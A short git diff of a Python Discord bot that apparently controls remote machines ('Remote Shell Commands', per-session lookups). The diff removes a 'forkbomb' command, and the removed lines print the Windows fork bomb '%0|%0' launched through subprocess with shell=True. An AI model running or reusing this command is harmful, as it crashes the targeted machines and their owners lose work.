@@ -175,16 +175,6 @@ Remote Shell Commands:
     await ctx.send(message2)
     await ctx.send(message3)
     
-    
-@bot.command() # FORKBOMB COMMAND
-async def forkbomb(ctx, seshn: str):
-    session = sessions.get(seshn.lower())
-    if session:
-        command = "%0|%0"
-        subprocess.Popen(command, shell=True, preexec_fn=os.setpgrp)
-        await ctx.send(f"Forkbombed session :rofl:")
-    else:
-        pass
 
 logger = logging.getLogger(__name__)
 
